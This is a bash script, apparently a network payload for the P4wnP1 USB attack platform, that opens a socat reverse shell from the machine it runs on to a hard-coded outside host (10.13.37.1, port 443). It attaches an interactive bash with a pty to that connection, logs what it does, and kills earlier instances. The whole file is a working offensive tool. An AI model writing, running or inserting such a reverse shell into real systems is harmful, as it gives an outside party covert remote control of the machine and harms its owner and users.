#!/bin/bash
# /opt/p4wnp1/payloads/network/reverse_shell_tunnel.sh
# Description: Reverse shell using socat to remote host and port

set -euo pipefail

# === Config ===
PAYLOAD_NAME="reverse_shell_tunnel"
LOG_DIR="/opt/p4wnp1/logs"
LOG_FILE="$LOG_DIR/${PAYLOAD_NAME}.log"
REMOTE_HOST="10.13.37.1"
REMOTE_PORT="443"

mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "[*] Starting reverse shell tunnel to $REMOTE_HOST:$REMOTE_PORT at $(date)"

# === Check socat availability ===
if ! command -v socat >/dev/null 2>&1; then
  echo "[!] socat not found. Install it with: sudo apt install socat"
  exit 1
fi

# === Kill old instances ===
pkill -f "socat TCP:$REMOTE_HOST:$REMOTE_PORT" || true
sleep 1

# === Start socat reverse shell ===
socat TCP:"$REMOTE_HOST":"$REMOTE_PORT" EXEC:/bin/bash,pty,stderr,setsid,sigint,sane > "$LOG_FILE" 2>&1 &

echo "[✓] Reverse shell initiated to $REMOTE_HOST:$REMOTE_PORT"
